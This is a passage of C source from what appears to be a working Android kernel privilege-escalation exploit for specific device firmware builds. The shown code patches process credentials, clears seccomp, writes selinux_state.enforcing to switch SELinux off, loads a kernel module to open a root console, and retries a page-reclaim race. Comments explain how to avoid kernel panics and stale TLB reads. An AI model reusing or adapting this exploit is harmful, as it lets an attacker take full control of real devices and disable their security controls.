          memcpy(&flags, (const void *)(tp + fl_off), 8);
          rp(r, "seccomp disarmed: flags=0x%llx mode=%u\n",
             (unsigned long long)flags,
             *(volatile uint32_t *)(tp + fl_off + T_SECCOMP_MODE));
          win_close(table, k);
          k++;
          /* Prove it: the next syscalls must pass now. */
          rp(r, "syscall ok pid=%d\n", (int)syscall(__NR_getpid));
        } else {
          rp(r, "WARN no entry for task flags\n");
        }
      }

      for (i = 3; i < RS_ENTRIES; i++) pt_close_window(&table[i]);
    }
  }

  *stage = 2;
  rp(r, "root_stage_done uid=%d euid=%d\n", getuid(), geteuid());

  /* Module load needs SELinux permissive: capability sys_module is denied to
   * untrusted_app even with uid 0. */
  if (kbuf || process_console_pending()) {
    volatile uint8_t *sp;
    /* High indices the task walk never touched: re-using an index whose VA
     * was accessed earlier leaves a stale TLB entry (there is no TLBI here),
     * and the read silently returns the old page (observed: 0x33 spray filler
     * instead of selinux_state). */
    sp = win_open(table, SELINUX_ENFORCING_WINDOW_SLOT, table0, SELINUX_PA, (volatile uint8_t *)
                  ((char *)spray_base + (size_t)found_block * BLOCK_BYTES));
    if (sp) {
      volatile uint8_t *ep = sp + (SELINUX_PA & 0xfff) + SELINUX_ENF_OFF;
      int unexpected_state = (run_hooks == -1 || !kbuf) && *ep != 1;
      rp(r, "selinux_state.enforcing before=%u\n", *ep);
      if (!unexpected_state) *ep = 0;
      rp(r, "selinux_state.enforcing after=%u\n", *ep);
      /* Close the same high-index slot used by win_open. Closing slot 20 here
       * left a kernel-physical-page PTE installed until munmap(), which made
       * zap_pte_range treat that temporary window as an ordinary user page. */
      win_close(table, SELINUX_ENFORCING_WINDOW_SLOT);
      if (unexpected_state) {
        rp(r, "adb_root: expected SELinux Enforcing before bootstrap\n");
        ret = -2;
        goto out;
      }
      ret = (kbuf ? load_module((void *)kbuf, ksize, ko_path, ksud_path,
                                run_hooks, prof, stext_va, r)
                  : process_console_bootstrap()) == 0 ? 0 : -2;
      sp = win_open(table, SELINUX_RESTORE_WINDOW_SLOT, table0, SELINUX_PA, (volatile uint8_t *)
                    ((char *)spray_base + (size_t)found_block * BLOCK_BYTES));
      if (sp) {
        *(volatile uint8_t *)(sp + (SELINUX_PA & 0xfff) + SELINUX_ENF_OFF) = 1;
        win_close(table, SELINUX_RESTORE_WINDOW_SLOT);
        rp(r, "selinux enforcing restored\n");
        if (run_hooks == -1 && ret == 0) rp(r, "adb_root: ready\n");
        if (!kbuf && ret == 0) {
          if (process_console_verify()) rp(r, "root_console: ready\n");
          else { rp(r, "root_console: live verification failed\n"); ret = -2; }
        }
      } else {
        rp(r, "FAIL SELinux restore window unavailable\n");
        ret = -2;
      }
    } else {
      rp(r, "WARN no entry for selinux\n");
      ret = -2;
    }
  } else {
    ret = 0;
  }

done:
out:
  if (imp != MAP_FAILED) munmap(imp, PAGE_BYTES);
  if (event != MAP_FAILED) munmap(event, PAGE_BYTES);
  chiroru_aio_destroy(&aio);
  if (fd >= 0) close(fd);
  if (spray_base != MAP_FAILED) munmap(spray_base, spray_len);
  else if (res != MAP_FAILED)
    munmap(res, BLOCK_BYTES * (size_t)SPRAY_BLOCKS + BLOCK_BYTES);
  return ret;
}

/*
 * Entry point.
 *
 * The reclaim (freed AIO page becoming an L3 PTE table) is a race, and in an
 * app process other threads compete for the just-freed page, so a single run
 * often ends with RECLAIM_NONE. Retrying is safe *as long as the previous
 * attempt did not modify any kernel state*: attempt_once() reports how far it
 * got in *stage* (0 = only reads, 1 = cred patched, 2 = seccomp cleared).
 *
 * A retry after stage >= 1 panics the kernel: clearing task->seccomp.filter
 * leaves the seccomp machinery with mode == 0 and a stale filter pointer, and
 * the next syscall hits "Internal error: Oops - BUG" in __secure_computing.
 * So the loop below only repeats stage-0 failures, and the cred/seccomp/module
 * stage runs at most once.
 */
static int profile_gate(const struct chiroru_profile *prof, struct rpt *r);

static int chiroru_root_with(const struct chiroru_profile *prof,
                             const char *ko_path, const char *ksud_path,
                             int run_hooks, struct rpt *r) {
  const int max_tries = 24;
  int i, stage = 0, rc = -1;
  const void *kbuf = NULL;
  size_t ksize = 0;
  void *kmap = MAP_FAILED;
  int kfd = -1;

  if (profile_gate(prof, r) != 0) return -1;

  /* Open and pre-fault the module NOW, while the process is still a plain
   * app. After the cred patch the SELinux domain is still untrusted_app, and
   * it is denied CAP_DAC_OVERRIDE, so own files can no longer be opened
   * (observed: EACCES on the .ko). The mapping itself stays readable. */
  if (ko_path) {
    struct stat st;
    kfd = open(ko_path, O_RDONLY);
    if (kfd < 0 || fstat(kfd, &st) || st.st_size <= 0) {
      rp(r, "FAIL open %s errno=%d\n", ko_path, errno);
      if (kfd >= 0) close(kfd);
      return -1;
    }
    ksize = (size_t)st.st_size;
    kmap = mmap(NULL, ksize, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_POPULATE,
                kfd, 0);
    if (kmap == MAP_FAILED) { rp(r, "FAIL mmap ko errno=%d\n", errno); close(kfd); return -1; }
    kbuf = kmap;
    rp(r, "ko preloaded %zu bytes at %p\n", ksize, kmap);
  }

  for (i = 1; i <= max_tries; i++) {
    rc = attempt_once(prof, kbuf, ksize, kfd, ko_path, ksud_path, run_hooks, r, &stage);
    if (rc == 0) {
      if (i > 1) rp(r, "==== ok on attempt %d/%d ====\n", i, max_tries);
      if (kmap != MAP_FAILED) munmap(kmap, ksize);
      if (kfd >= 0) close(kfd);
      return 0;
    }
    if (stage > 0) {
      process_console_close();
      rp(r, "==== stopped at stage %d, not retrying ====\n", stage);
      /* A post-credential failure is not retryable, but the app process may
       * stay alive to display the report. Release the preloaded module mapping
       * and descriptor instead of leaking them on every failed manual run. */
      if (kmap != MAP_FAILED) munmap(kmap, ksize);
      if (kfd >= 0) close(kfd);
      return rc;
    }
    rp(r, "---- attempt %d/%d: no reclaim, retrying ----\n", i, max_tries);
    usleep(30000);
  }
  rp(r, "==== gave up after %d attempts ====\n", max_tries);
  process_console_close();
  if (kmap != MAP_FAILED) munmap(kmap, ksize);
  if (kfd >= 0) close(kfd);
  return -1;
}

/* Mandatory exact identity gate for both profiles. Reads only properties and
 * uname; it never touches the kernel. */
static int profile_gate(const struct chiroru_profile *prof, struct rpt *r) {
  char fp[192] = {0}, inc[96] = {0}, sdk[16] = {0};
  struct utsname u;

  if (!prof->fingerprint || !prof->incremental || !prof->kernel_release || !prof->machine) {
    rp(r, "preflight: blocked (incomplete firmware profile)\n");
    return -1;
  }
  __system_property_get("ro.build.fingerprint", fp);
  __system_property_get("ro.build.version.incremental", inc);
  __system_property_get("ro.build.version.sdk", sdk);
  if (uname(&u) != 0) { rp(r, "preflight: blocked (uname failed)\n"); return -1; }
  if (strcmp(fp, prof->fingerprint) || strcmp(inc, prof->incremental) ||
      strcmp(u.release, prof->kernel_release) || strcmp(u.machine, prof->machine) ||
      strcmp(sdk, "30") || sysconf(_SC_PAGESIZE) != 4096) {
    rp(r, "preflight: blocked (firmware mismatch)\n"
          "  have: %s / %s / %s\n  need: %s / %s / %s\n",
       fp, inc, u.release, prof->fingerprint, prof->incremental,
       prof->kernel_release);
    return -1;
  }
  return 0;
}

int chiron_5000001307_root(const char *ko_path, const char *ksud_path,
                           int run_hooks, struct rpt *r) {
  return chiroru_root_with(&profile_5000001307, ko_path, ksud_path, run_hooks, r);
}

int chiron_1982735225_root(const char *ko_path, const char *ksud_path,
                           int run_hooks, struct rpt *r) {
  return chiroru_root_with(&profile_1982735225, ko_path, ksud_path, run_hooks, r);
}

int chiron_5000001245_root(const char *ko_path, const char *ksud_path,
                           int run_hooks, struct rpt *r) {
  return chiroru_root_with(&profile_5000001245, ko_path, ksud_path, run_hooks, r);
}

int chiron_5000001248_root(const char *ko_path, const char *ksud_path,
                           int run_hooks, struct rpt *r) {
  return chiroru_root_with(&profile_5000001248, ko_path, ksud_path, run_hooks, r);
}

int chiron_5000001289_root(const char *ko_path, const char *ksud_path,
                           int run_hooks, struct rpt *r) {
  return chiroru_root_with(&profile_5000001289, ko_path, ksud_path, run_hooks, r);
}

int chiron_5000001321_root(const char *ko_path, const char *ksud_path,
                           int run_hooks, struct rpt *r) {
  return chiroru_root_with(&profile_5000001321, ko_path, ksud_path, run_hooks, r);
}

int chiron_5000001346_root(const char *ko_path, const char *ksud_path,
                           int run_hooks, struct rpt *r) {
  return chiroru_root_with(&profile_5000001346, ko_path, ksud_path, run_hooks, r);
}

const char *chiron_1982735225_probe(void) {
  static char out[6144];
  char fp[192] = {0}, inc[96] = {0};
  struct utsname u;
  int gate;

  __system_property_get("ro.build.fingerprint", fp);
  __system_property_get("ro.build.version.incremental", inc);
  if (uname(&u) != 0) { u.release[0] = 0; u.machine[0] = 0; }
  gate = !strcmp(fp, profile_1982735225.fingerprint) &&
         !strcmp(inc, profile_1982735225.incremental) &&
         !strcmp(u.release, profile_1982735225.kernel_release);
  snprintf(out, sizeof out,
           "factory profile: %s\n"
           "fingerprint=%s\nincremental=%s\nkernel=%s machine=%s\n%s",
           gate ? "exact match" : "MISMATCH — no operation will run",
           fp, inc, u.release, u.machine, mali_jm_probe());
  return out;
}

static int adb_app_identity(struct rpt *r) {
  char context[160] = {0};
  uid_t uid = getuid();
  int fd = open("/proc/self/attr/current", O_RDONLY | O_CLOEXEC);
  ssize_t n = fd < 0 ? -1 : read(fd, context, sizeof context - 1);
  if (fd >= 0) close(fd);
  if (n <= 0 || uid < 10000 || uid > 19999 ||
      strncmp(context, "u:r:untrusted_app:s0:c", sizeof("u:r:untrusted_app:s0:c") - 1)) {
    rp(r, "preflight: blocked (cannot enroll console identity)\n");
    return -1;
  }
  context[strcspn(context, "\n")] = 0;
  if (strspn(context, "abcdefghijklmnopqrstuvwxyz0123456789_:,") != strlen(context)) return -1;
  return uid;
}

int chiron_5000001307_adb_root(const char *ko, const char *loader, int hooks, struct rpt *r) {
  (void)hooks;
  if (!ko || !loader) { rp(r, "preflight: blocked (ADB module and loader required)\n"); return -1; }
  /* Capture the actual app identity before the bootstrap changes credentials. */
  char context[160] = {0};
  int uid = adb_app_identity(r);
  if (uid < 0) return -1;
  int fd = open("/proc/self/attr/current", O_RDONLY | O_CLOEXEC);
  ssize_t n = fd < 0 ? -1 : read(fd, context, sizeof context - 1);
  if (fd >= 0) close(fd);
  if (n <= 0) return -1;
  context[strcspn(context, "\n")] = 0;
  if (snprintf(adb_console_params, sizeof adb_console_params,
               "console_uid=%u console_context=%s", (unsigned)uid, context) >= (int)sizeof adb_console_params) return -1;
  return chiroru_root_with(&profile_5000001307, ko, loader, -1, r);
}

int chiron_5000001245_adb_root(const char *ko, const char *loader, int hooks, struct rpt *r) {
  (void)hooks;
  if (!ko || !loader) { rp(r, "preflight: blocked (ADB module and loader required)\n"); return -1; }
  char context[160] = {0};
  int uid = adb_app_identity(r);
  if (uid < 0) return -1;
  int fd = open("/proc/self/attr/current", O_RDONLY | O_CLOEXEC);
  ssize_t n = fd < 0 ? -1 : read(fd, context, sizeof context - 1);
  if (fd >= 0) close(fd);
  if (n <= 0) return -1;
  context[strcspn(context, "\n")] = 0;
  if (snprintf(adb_console_params, sizeof adb_console_params,
               "console_uid=%u console_context=%s", (unsigned)uid, context) >= (int)sizeof adb_console_params) return -1;
  return chiroru_root_with(&profile_5000001245, ko, loader, -1, r);
}

int chiron_5000001248_adb_root(const char *ko, const char *loader, int hooks, struct rpt *r) {
  (void)hooks;
  if (!ko || !loader) { rp(r, "preflight: blocked (ADB module and loader required)\n"); return -1; }
  char context[160] = {0};
  int uid = adb_app_identity(r);
  if (uid < 0) return -1;
  int fd = open("/proc/self/attr/current", O_RDONLY | O_CLOEXEC);
  ssize_t n = fd < 0 ? -1 : read(fd, context, sizeof context - 1);
  if (fd >= 0) close(fd);
  if (n <= 0) return -1;
  context[strcspn(context, "\n")] = 0;
  if (snprintf(adb_console_params, sizeof adb_console_params,
               "console_uid=%u console_context=%s", (unsigned)uid, context) >= (int)sizeof adb_console_params) return -1;
  return chiroru_root_with(&profile_5000001248, ko, loader, -1, r);
}

int chiron_5000001289_adb_root(const char *ko, const char *loader, int hooks, struct rpt *r) {
  (void)hooks;
  if (!ko || !loader) { rp(r, "preflight: blocked (ADB module and loader required)\n"); return -1; }
  char context[160] = {0};
  int uid = adb_app_identity(r);
  if (uid < 0) return -1;
  int fd = open("/proc/self/attr/current", O_RDONLY | O_CLOEXEC);
  ssize_t n = fd < 0 ? -1 : read(fd, context, sizeof context - 1);
  if (fd >= 0) close(fd);
  if (n <= 0) return -1;
  context[strcspn(context, "\n")] = 0;
  if (snprintf(adb_console_params, sizeof adb_console_params,
               "console_uid=%u console_context=%s", (unsigned)uid, context) >= (int)sizeof adb_console_params) return -1;
  return chiroru_root_with(&profile_5000001289, ko, loader, -1, r);
}

int chiron_5000001321_adb_root(const char *ko, const char *loader, int hooks, struct rpt *r) {
  (void)hooks;
  if (!ko || !loader) { rp(r, "preflight: blocked (ADB module and loader required)\n"); return -1; }
  char context[160] = {0};
  int uid = adb_app_identity(r);
  if (uid < 0) return -1;
  int fd = open("/proc/self/attr/current", O_RDONLY | O_CLOEXEC);
  ssize_t n = fd < 0 ? -1 : read(fd, context, sizeof context - 1);
  if (fd >= 0) close(fd);
  if (n <= 0) return -1;
  context[strcspn(context, "\n")] = 0;
  if (snprintf(adb_console_params, sizeof adb_console_params,
               "console_uid=%u console_context=%s", (unsigned)uid, context) >= (int)sizeof adb_console_params) return -1;
  return chiroru_root_with(&profile_5000001321, ko, loader, -1, r);
}

int chiron_5000001346_adb_root(const char *ko, const char *loader, int hooks, struct rpt *r) {
  (void)hooks;
  if (!ko || !loader) { rp(r, "preflight: blocked (ADB module and loader required)\n"); return -1; }
  char context[160] = {0};
  int uid = adb_app_identity(r);
  if (uid < 0) return -1;
  int fd = open("/proc/self/attr/current", O_RDONLY | O_CLOEXEC);
  ssize_t n = fd < 0 ? -1 : read(fd, context, sizeof context - 1);
  if (fd >= 0) close(fd);
  if (n <= 0) return -1;
  context[strcspn(context, "\n")] = 0;
  if (snprintf(adb_console_params, sizeof adb_console_params,
               "console_uid=%u console_context=%s", (unsigned)uid, context) >= (int)sizeof adb_console_params) return -1;
  return chiroru_root_with(&profile_5000001346, ko, loader, -1, r);
}

int chiron_1982735225_adb_root(const char *ko, const char *loader, int hooks, struct rpt *r) {
  (void)hooks;
  if (!ko) { rp(r, "preflight: blocked (ADB module required)\n"); return -1; }
  if (profile_gate(&profile_1982735225, r) != 0) return -1;
  if (adb_app_identity(r) < 0) return -1;
  /* The factory ADB module is loaded in ADB-only mode: the in-app root console
   * is already provided by the credential path, and direct init_module has no
   * way to pass enrollment parameters. */
  adb_console_params[0] = 0;
  return chiroru_root_with(&profile_1982735225, ko, loader, -1, r);
}
